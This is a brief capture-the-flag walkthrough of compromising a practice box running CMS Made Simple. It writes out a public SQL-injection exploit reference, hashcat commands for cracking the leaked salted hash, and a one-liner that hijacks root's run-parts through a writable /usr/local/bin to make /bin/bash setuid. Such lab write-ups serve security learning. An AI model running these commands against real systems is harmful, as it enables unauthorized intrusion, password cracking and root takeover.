this box shows a webserver and ssh

looking at the webpage there isnt a lot
visiting /robots.txt
we find the /writeup directory

here in the source we find it is made with cms made simple

looking for an exploit gets us an exploit
https://www.exploit-db.com/exploits/46635
after fixign it for python3 and running it
we get a user, password hash, and salt

with this we can crack the password:
echo {password}:{salt}> hash
hashcat -a 0 -m 20 hash /usr/share/wordlists/rockyou.txt

so we can login at the ssh with these credentials

id shows us a non standard group: staff
this group is special bcs it allows us to write to /usr/local/bin and /usr/local/sbin
ls -ld /usr/local/bin/ /usr/local/sbin/

uploading pspy
wget https://github.com/DominicBreuker/pspy/releases/download/v1.0.0/pspy32
scp pspy32 jkr@10.10.10.138:/tmp
and running it a first terminal
and logging in on a second terminal

using this we saw that root runs "run-parts"

and using this oneliner we can hijack it
echo -e '#!/bin/bash\n\nchmod u+s /bin/bash' > /usr/local/bin/run-parts; chmod +x /usr/local/bin/run-parts

then after a new login and
/bin/bash -p

we are logged in as root
